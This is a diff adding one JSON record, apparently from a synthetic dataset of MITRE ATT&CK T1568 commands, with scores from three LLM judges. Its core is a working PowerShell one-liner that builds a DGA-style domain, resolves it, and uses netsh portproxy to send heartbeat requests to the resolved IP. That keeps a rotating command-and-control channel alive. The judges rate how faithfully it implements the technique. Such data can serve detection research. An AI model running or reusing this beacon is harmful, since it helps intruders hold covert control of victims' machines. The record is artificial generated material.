@@ -1,0 +1,56 @@
+{
+  "technique_id": "T1568",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "$d='cdn'+(Get-Date -Format 'MMdd')+(Get-Random -Min 10 -Max 99)+'.net';for($i=0;$i -lt 3;$i++){try{$a=Resolve-DnsName -Name $d -Type A -Server 1.1.1.1 -ErrorAction Stop;$pick=$a|Get-Random;$ip=$pick.IPAddress;$ttl=[int]$pick.TTL;netsh interface portproxy set v4tov4 listenaddress=127.0.0.1 listenport=4444 connectaddress=$ip connectport=443;Invoke-WebRequest -Uri 'http://127.0.0.1:4444/heartbeat' -UseBasicParsing -Headers @{Flux='1';Dom=$d;IP=$ip} -TimeoutSec 5;Start-Sleep -Seconds ([Math]::Min(($ttl+5),60))}catch{Start-Sleep -Seconds 5}}",
+  "explanation": "Targets a DGA domain likely backed by fast-flux; periodically re-resolves and updates the portproxy to whichever IP is active within TTL jitter to maintain a dynamic C2 channel.",
+  "rationale_steps": [
+    "Leverage fast-flux behavior by honoring TTL and rotating IP endpoints.",
+    "Continuously refresh the portproxy mapping to sustain connectivity via dynamic resolution."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1568-0a23acf2-f3797414",
+  "source_prompt_hash": "0a23acf2",
+  "timestamp_utc": "2025-09-30T09:39:46.357850Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is perfectly well-formed with balanced quotes, parentheses, and braces, proper command separators, valid flag formats, and appropriate error handling.",
+        "semantic_score": 5,
+        "semantic_justification": "The command fully implements the T1568 Dynamic Resolution technique by algorithmically generating domain names based on date patterns, resolving them through DNS, setting up port forwarding to the resolved IP, and implementing TTL-aware reconnection logic with error handling.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T05:22:59.181511Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct PowerShell syntax, balanced parentheses/braces, valid cmdlet usage, and proper command separators.",
+        "semantic_score": 4,
+        "semantic_justification": "The command perfectly implements DGA, dynamic resolution, fast-flux adaptation, and beaconing to maintain C2, but the `netsh interface portproxy` command typically requires Administrator privileges, contradicting the stated 'Privilege: None'.",
+        "combined_score": 4.5,
+        "confidence": 1,
+        "timestamp": "2025-10-02T05:23:11.377627Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed PowerShell with balanced quotes/braces, valid cmdlets/parameters, and proper separators that should parse in Windows PowerShell.",
+        "semantic_score": 3,
+        "semantic_justification": "It demonstrates dynamic resolution and endpoint churn aligned with T1568 (DGA-style domain, TTL-based re-resolve, fast-flux selection) but depends on netsh portproxy requiring admin despite 'Privilege: None' and only iterates three times, limiting practical C2 viability.",
+        "combined_score": 4.0,
+        "confidence": 0.8,
+        "timestamp": "2025-10-02T05:23:25.715029Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
